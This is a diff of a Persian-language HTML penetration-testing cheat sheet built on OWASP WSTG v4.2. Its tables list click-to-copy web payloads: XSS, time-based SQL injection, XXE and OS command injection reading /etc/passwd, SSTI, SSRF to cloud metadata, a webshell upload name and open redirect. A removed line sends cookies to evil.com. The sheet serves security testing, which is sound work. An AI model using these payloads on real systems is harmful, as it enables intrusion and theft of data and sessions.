+                        <td>بیکار ماندن تب به مدت ۱۵-۳۰ دقیقه و بررسی اینکه آیا نشست به طور خودکار منقضی می‌شود.</td>
                     </tr>
                 </table>
             </div>
         </div>
 
-        <!-- 7. Input Validation (XSS, SQLi, etc.) -->
-        <div class="card">
-            <h2>💉 ۷. اعتبارسنجی ورودی‌ها (WSTG-INPV)</h2>
+        <!-- 7. Input Validation -->
+        <div class="card" id="inpv">
+            <h2>💉 ۷. اعتبارسنجی ورودی (Input Validation)</h2>
             <div class="table-responsive">
                 <table>
+                    <tr><th style="width: 12%;">شناسه</th><th style="width: 15%;">عنوان</th><th style="width: 12%;">ابزار</th><th style="width: 61%;">سناریو و پی‌لود / دستور</th></tr>
                     <tr>
-                        <th style="width: 15%;">شناسه</th>
-                        <th style="width: 18%;">دسته‌بندی</th>
-                        <th style="width: 15%;">ابزار</th>
-                        <th style="width: 52%;">سناریو و روش تست عملیاتی</th>
+                        <td><span class="badge">WSTG-INPV-01</span></td><td>XSS انعکاسی</td><td><span class="tool-badge">Browser</span></td>
+                        <td>تزریق کدهای JS در پارامترهای جستجو یا URL جهت اجرا در سمت کاربر:<div class="click-to-copy" onclick="copySnippet(this)">&lt;svg/onload=alert(document.domain)&gt;</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-INPV-01</span></td>
-                        <td>XSS انعکاسی</td>
-                        <td><span class="tool-badge">Browser</span></td>
-                        <td>تست پارامترهای URL و فرم‌های جستجو. استفاده از پی‌لود دور زدن WAF:<div class="click-to-copy" onclick="copySnippet(this)">&lt;svg/onload=prompt(document.cookie)&gt;</div></td>
+                        <td><span class="badge">WSTG-INPV-02</span></td><td>XSS ذخیره‌شده</td><td><span class="tool-badge">Browser</span></td>
+                        <td>ثبت پی‌لود در دیتابیس (مثل پروفایل یا نظرات) برای اجرای خودکار هنگام بازدید دیگران:<div class="click-to-copy" onclick="copySnippet(this)">&lt;img src=x onerror=prompt(1)&gt;</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-INPV-02</span></td>
-                        <td>XSS ذخیره‌شده</td>
-                        <td><span class="tool-badge">Browser</span></td>
-                        <td>تزریق در بخش کامنت‌ها، نام کاربری یا تیکت‌های پشتیبانی:<div class="click-to-copy" onclick="copySnippet(this)">&lt;img src="x" onerror="fetch('https://evil.com/?c='+document.cookie)"&gt;</div></td>
+                        <td><span class="badge">WSTG-INPV-04</span></td><td>آلودگی پارامتر (HPP)</td><td><span class="tool-badge">Burp Suite</span></td>
+                        <td>ارسال پارامترهای تکراری برای دور زدن منطق سرور یا WAF:<div class="click-to-copy" onclick="copySnippet(this)">?user=admin&user=hacker</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-INPV-05</span></td>
-                        <td>تزریق SQL (SQLi)</td>
-                        <td><span class="tool-badge">Burp / SQLMap</span></td>
-                        <td>استفاده از کاراکتر سینگل‌کوتیشن یا توابع تاخیر زمانی (Time-based):<div class="click-to-copy" onclick="copySnippet(this)">id=1'; WAITFOR DELAY '0:0:10'--</div></td>
+                        <td><span class="badge">WSTG-INPV-05</span></td><td>تزریق SQL (SQLi)</td><td><span class="tool-badge">SQLMap / Burp</span></td>
+                        <td>تست تزریق Boolean یا Time-Based در پارامترهای ارتباط با دیتابیس:<div class="click-to-copy" onclick="copySnippet(this)">id=1' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-INPV-09</span></td>
-                        <td>تزریق XML (XXE)</td>
-                        <td><span class="tool-badge">Burp Suite</span></td>
-                        <td>تغییر فرمت درخواست به XML و تزریق انتیتی‌های خارجی:<div class="click-to-copy" onclick="copySnippet(this)">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;&#10;&lt;data&gt;&amp;xxe;&lt;/data&gt;</div></td>
+                        <td><span class="badge">WSTG-INPV-08</span></td><td>تزریق XML (XXE)</td><td><span class="tool-badge">Burp Repeater</span></td>
+                        <td>استخراج فایل‌های لوکال در اندپوینت‌هایی که XML دریافت می‌کنند:<div class="click-to-copy" onclick="copySnippet(this)">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-INPV-11</span></td>
-                        <td>تزریق دستور (OS)</td>
-                        <td><span class="tool-badge">Burp Suite</span></td>
-                        <td>افزودن دستورات سیستم‌عامل به ورودی‌های اجرایی (مثل IP Ping):<div class="click-to-copy" onclick="copySnippet(this)">127.0.0.1; cat /etc/passwd #</div></td>
+                        <td><span class="badge">WSTG-INPV-11</span></td><td>تزریق دستور (OS Cmd)</td><td><span class="tool-badge">Burp Suite</span></td>
+                        <td>افزودن دستورات سیستمی به ورودی‌های اجرایی:<div class="click-to-copy" onclick="copySnippet(this)">127.0.0.1; cat /etc/passwd #</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-INPV-17</span></td>
-                        <td>Host Header Injection</td>
-                        <td><span class="tool-badge">Burp Repeater</span></td>
-                        <td>تغییر هدر Host در درخواست‌های فراموشی رمز عبور جهت مسموم کردن لینک ریست پسورد:<div class="click-to-copy" onclick="copySnippet(this)">Host: evil-attacker.com</div></td>
+                        <td><span class="badge">WSTG-INPV-12</span></td><td>آپلود فایل مخرب</td><td><span class="tool-badge">Burp Suite</span></td>
+                        <td>دور زدن فیلترهای آپلود و بارگذاری وب‌شل با دستکاری هدر Content-Type یا افزونه:<div class="click-to-copy" onclick="copySnippet(this)">shell.php.jpg (Polyglot/Null byte bypass)</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-INPV-18</span></td>
-                        <td>تزریق قالب (SSTI)</td>
-                        <td><span class="tool-badge">Burp Suite</span></td>
-                        <td>تست موتورهای قالب‌ساز (مثل Jinja2 یا Twig) با تزریق عبارات ریاضی:<div class="click-to-copy" onclick="copySnippet(this)">${7*7} یا {{7*7}}</div></td>
+                        <td><span class="badge">WSTG-INPV-17</span></td><td>تزریق هدر Host</td><td><span class="tool-badge">Burp Repeater</span></td>
+                        <td>تغییر هدر Host به آدرس مهاجم در زمان ریست پسورد برای سرقت توکن تغییر رمز.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INPV-18</span></td><td>تزریق قالب (SSTI)</td><td><span class="tool-badge">Burp Suite</span></td>
+                        <td>ارزیابی متغیرها در فریم‌ورک‌های تمپلیت (Jinja2, Twig) برای اجرای کد (RCE):<div class="click-to-copy" onclick="copySnippet(this)">${7*7} یا {{7*7}} یا &lt;% 7*7 %&gt;</div></td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INPV-19</span></td><td>جعل درخواست سرور (SSRF)</td><td><span class="tool-badge">Burp Collaborator</span></td>
+                        <td>وادار کردن سرور به ارسال درخواست به شبکه‌های داخلی یا متادیتای کلود (AWS):<div class="click-to-copy" onclick="copySnippet(this)">url=http://169.254.169.254/latest/meta-data/</div></td>
                     </tr>
                 </table>
             </div>
         </div>
 
-        <!-- 8 & 9. Error Handling & Cryptography -->
-        <div class="card">
-            <h2>⚠️ ۸ و ۹. مدیریت خطا و رمزنگاری (WSTG-ERRH & CRYP)</h2>
+        <!-- 8. Error Handling -->
+        <div class="card" id="errh">
+            <h2>⚠️ ۸. مدیریت خطا (Error Handling)</h2>
             <div class="table-responsive">
                 <table>
+                    <tr><th style="width: 12%;">شناسه</th><th style="width: 15%;">عنوان</th><th style="width: 12%;">ابزار</th><th style="width: 61%;">سناریو و پی‌لود / دستور</th></tr>
                     <tr>
-                        <th style="width: 15%;">شناسه</th>
-                        <th style="width: 18%;">دسته‌بندی</th>
-                        <th style="width: 15%;">ابزار</th>
-                        <th style="width: 52%;">سناریو و روش تست عملیاتی</th>
+                        <td><span class="badge">WSTG-ERRH-01</span></td><td>کدهای خطای حساس</td><td><span class="tool-badge">Burp</span></td>
+                        <td>تزریق کاراکترهای <code>'</code> یا <code>[]</code> و بررسی اینکه آیا سرور خطاهای SQL یا مسیر فیزیکی فایل‌ها را فاش می‌کند.</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-ERRH-01</span></td>
-                        <td>نشتی اطلاعات در خطا</td>
-                        <td><span class="tool-badge">Burp Suite</span></td>
-                        <td>ارسال کاراکترهای نامعتبر مثل <code>%00</code> یا آرایه‌های PHP (<code>id[]=1</code>) برای وادار کردن سرور به نمایش Stack Trace پایگاه داده.</td>
+                        <td><span class="badge">WSTG-ERRH-02</span></td><td>نشت Stack Traces</td><td><span class="tool-badge">Manual</span></td>
+                        <td>بررسی خطاهای زبان برنامه‌نویسی (Java, .NET) که ساختار داخلی نرم‌افزار را لو می‌دهند.</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <!-- 9. Cryptography -->
+        <div class="card" id="cryp">
+            <h2>🔐 ۹. رمزنگاری ضعیف (Cryptography)</h2>
+            <div class="table-responsive">
+                <table>
+                    <tr><th style="width: 12%;">شناسه</th><th style="width: 15%;">عنوان</th><th style="width: 12%;">ابزار</th><th style="width: 61%;">سناریو و پی‌لود / دستور</th></tr>
+                    <tr>
+                        <td><span class="badge">WSTG-CRYP-01</span></td><td>کانال غیرامن</td><td><span class="tool-badge">Browser</span></td>
+                        <td>دسترسی به سایت از طریق <code>http://</code> به جای <code>https://</code> و عدم ریدایرکت اجباری.</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-CRYP-03</span></td>
-                        <td>داده‌های حساس (Cleartext)</td>
-                        <td><span class="tool-badge">Wireshark</span></td>
-                        <td>بررسی ترافیک شبکه تا اطمینان حاصل شود که هیچ توکن، رمز عبور یا داده PII روی پروتکل‌های غیرامن (HTTP/FTP) ارسال نمی‌شود.</td>
+                        <td><span class="badge">WSTG-CRYP-04</span></td><td>الگوریتم‌های ضعیف</td><td><span class="tool-badge">Burp</span></td>
+                        <td>استفاده از هش‌های قابل شکستن (مثل MD5 یا SHA1) برای ذخیره رمزهای عبور یا توکن‌ها.</td>
                     </tr>
                 </table>
             </div>
         </div>
 
         <!-- 10. Business Logic -->
-        <div class="card">
-            <h2>💼 ۱۰. منطق تجاری (WSTG-BUSL)</h2>
+        <div class="card" id="busl">
+            <h2>💼 ۱۰. منطق تجاری (Business Logic)</h2>
             <div class="table-responsive">
                 <table>
+                    <tr><th style="width: 12%;">شناسه</th><th style="width: 15%;">عنوان</th><th style="width: 12%;">ابزار</th><th style="width: 61%;">سناریو و پی‌لود / دستور</th></tr>
                     <tr>
-                        <th style="width: 15%;">شناسه</th>
-                        <th style="width: 18%;">دسته‌بندی</th>
-                        <th style="width: 15%;">ابزار</th>
-                        <th style="width: 52%;">سناریو و روش تست عملیاتی</th>
+                        <td><span class="badge">WSTG-BUSL-01</span></td><td>اعتبارسنجی منطق داده</td><td><span class="tool-badge">Burp Repeater</span></td>
+                        <td>تغییر قیمت یا تعداد کالا در سبد خرید به اعداد منفی یا اعشاری نامتعارف:<div class="click-to-copy" onclick="copySnippet(this)">price=-1000 & quantity=-5</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-BUSL-01</span></td>
-                        <td>اعتبارسنجی منطق داده</td>
-                        <td><span class="tool-badge">Burp Suite</span></td>
-                        <td>تغییر پارامترهای عددی حساس مانند تغییر تعداد آیتم سبد خرید به عدد منفی برای کاهش مبلغ نهایی فاکتور:<div class="click-to-copy" onclick="copySnippet(this)">quantity=-5&amp;price=1000</div></td>
+                        <td><span class="badge">WSTG-BUSL-02</span></td><td>جعل درخواست</td><td><span class="tool-badge">Browser (F12)</span></td>
+                        <td>تغییر فیلدهای مخفی (Hidden Fields) در فرم‌های HTML جهت تغییر تخفیف یا نقش:<div class="click-to-copy" onclick="copySnippet(this)">&lt;input type="hidden" name="discount" value="100"&gt;</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-BUSL-02</span></td>
-                        <td>جعل درخواست</td>
-                        <td><span class="tool-badge">Browser (F12)</span></td>
-                        <td>بررسی فرم‌های HTML و فیلدهای پنهان (Hidden) جهت دور زدن مراحل پرداخت یا تغییر پارامترهای وضعیت کاربری:<div class="click-to-copy" onclick="copySnippet(this)">&lt;input type="hidden" name="is_admin" value="true"&gt;</div></td>
+                        <td><span class="badge">WSTG-BUSL-05</span></td><td>محدودیت‌ها و سهمیه</td><td><span class="tool-badge">Burp Intruder</span></td>
+                        <td>استفاده همزمان و مکرر از یک کد تخفیف یکبار مصرف با تکنیک Race Condition.</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-BUSL-06</span></td>
-                        <td>دور زدن مراحل (Workflow)</td>
-                        <td><span class="tool-badge">Burp Suite</span></td>
-                        <td>کپی کردن لینک مرحله نهایی پرداخت (مرحله موفقیت‌آمیز) و فراخوانی آن پیش از انجام واریز وجه، جهت بررسی دریافت محصول بدون پرداخت.</td>
+                        <td><span class="badge">WSTG-BUSL-06</span></td><td>بایپس جریان کار (Workflow)</td><td><span class="tool-badge">Burp Suite</span></td>
+                        <td>رد کردن مرحله پرداخت با کپی کردن URL صفحه "پرداخت موفق" و لود کردن آن پیش از واریز وجه.</td>
                     </tr>
                 </table>
             </div>
         </div>
 
         <!-- 11. Client Side -->
-        <div class="card">
-            <h2>💻 ۱۱. آسیب‌پذیری‌های سمت کلاینت (WSTG-CLNT)</h2>
+        <div class="card" id="clnt">
+            <h2>💻 ۱۱. آسیب‌پذیری‌های سمت کلاینت (Client-Side)</h2>
             <div class="table-responsive">
                 <table>
+                    <tr><th style="width: 12%;">شناسه</th><th style="width: 15%;">عنوان</th><th style="width: 12%;">ابزار</th><th style="width: 61%;">سناریو و پی‌لود / دستور</th></tr>
                     <tr>
-                        <th style="width: 15%;">شناسه</th>
-                        <th style="width: 18%;">دسته‌بندی</th>
-                        <th style="width: 15%;">ابزار</th>
-                        <th style="width: 52%;">سناریو و روش تست عملیاتی</th>
+                        <td><span class="badge">WSTG-CLNT-01</span></td><td>DOM Based XSS</td><td><span class="tool-badge">Browser</span></td>
+                        <td>استفاده از کاراکتر # در URL برای تزریق کد به توابع JS آسیب‌پذیر (Sinkها):<div class="click-to-copy" onclick="copySnippet(this)">https://target.com/page#&lt;svg onload=alert(1)&gt;</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-CLNT-01</span></td>
-                        <td>DOM Based XSS</td>
-                        <td><span class="tool-badge">Browser</span></td>
-                        <td>تزریق پی‌لود در Fragment هشتگ URL (بخشی که به سرور ارسال نمی‌شود) برای تست Sink های جاوا اسکریپت:<div class="click-to-copy" onclick="copySnippet(this)">https://target.com/page#&lt;img src=x onerror=alert(1)&gt;</div></td>
+                        <td><span class="badge">WSTG-CLNT-04</span></td><td>ریدایرکت باز (Open Redirect)</td><td><span class="tool-badge">Burp Suite</span></td>
+                        <td>تغییر پارامترهای انتقال (مثل next یا return_url) به دامنه مخرب:<div class="click-to-copy" onclick="copySnippet(this)">?next=https://evil.com</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-CLNT-09</span></td>
-                        <td>Clickjacking</td>
-                        <td><span class="tool-badge">HTML Script</span></td>
-                        <td>تلاش برای لود کردن وب‌سایت در یک iframe روی دامنه تستر برای بررسی عدم وجود هدر X-Frame-Options:<div class="click-to-copy" onclick="copySnippet(this)">&lt;iframe src="https://target.com/settings" opacity="0.5"&gt;&lt;/iframe&gt;</div></td>
+                        <td><span class="badge">WSTG-CLNT-09</span></td><td>حمله Clickjacking</td><td><span class="tool-badge">HTML Script</span></td>
+                        <td>بررسی لود شدن صفحات حساس داخل Iframe جهت سرقت کلیک‌های کاربر:<div class="click-to-copy" onclick="copySnippet(this)">&lt;iframe src="https://target.com/delete-account"&gt;&lt;/iframe&gt;</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-CLNT-10</span></td>
-                        <td>تست WebSockets</td>
-                        <td><span class="tool-badge">Burp WebSockets</span></td>
-                        <td>رهگیری ترافیک تبادل شده در WebSocket و دستکاری پیام‌ها جهت بررسی وجود XSS یا SQLi در داده‌های لحظه‌ای (Real-time).</td>
+                        <td><span class="badge">WSTG-CLNT-10</span></td><td>تست WebSockets</td><td><span class="tool-badge">Burp WebSockets</span></td>
+                        <td>دستکاری پیام‌های تبادل شده در سوکت‌ها برای تست XSS یا SQLi به صورت Real-Time.</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-CLNT-11</span></td>
-                        <td>Web Storage</td>
-                        <td><span class="tool-badge">Browser Console</span></td>
-                        <td>بررسی تب Application در مرورگر (Local/Session Storage). استخراج اطلاعات حساس یا توکن‌های JWT با دستور:<div class="click-to-copy" onclick="copySnippet(this)">console.log(localStorage.getItem('access_token'));</div></td>
+                        <td><span class="badge">WSTG-CLNT-11</span></td><td>داده‌های Local Storage</td><td><span class="tool-badge">Browser Console</span></td>
+                        <td>بررسی عدم ذخیره‌سازی توکن‌های حساس (JWT) در حافظه محلی مرورگر:<div class="click-to-copy" onclick="copySnippet(this)">console.log(localStorage.getItem('token'));</div></td>
                     </tr>
                 </table>
             </div>
         </div>
 
         <footer>
-            طراحی شده بر اساس استاندارد OWASP WSTG v4.2 - داشبورد عملیاتی تست نفوذ<br>
-            <small>⚠️ توجه: این لیست شامل کلیدی‌ترین تست‌های استاندارد بین‌المللی است.</small>
+            نسخه پیشرفته و کامل داشبورد تست نفوذ - بر اساس متدولوژی OWASP WSTG v4.2<br>
+            <small>✅ این فایل با استانداردهای HTML5 و CSS3 طراحی شده و در تمامی مرورگرها به درستی اجرا می‌شود.</small>
         </footer>
     </div>
 
     <script>
         function copySnippet(element) {
-            // حذف کاراکترهای اضافی خط جدید برای کپی تمیزتر
             const text = element.innerText;
             navigator.clipboard.writeText(text).then(() => {
                 const originalHTML = element.innerHTML;
@@ -567,7 +431,7 @@
                     element.classList.remove('copied');
                 }, 1500);
             }).catch(err => {
-                alert('خطا در کپی کردن متن!');
+                alert('خطا در کپی کردن متن! دسترسی کلیپ‌بورد را بررسی کنید.');
             });
         }
     </script>
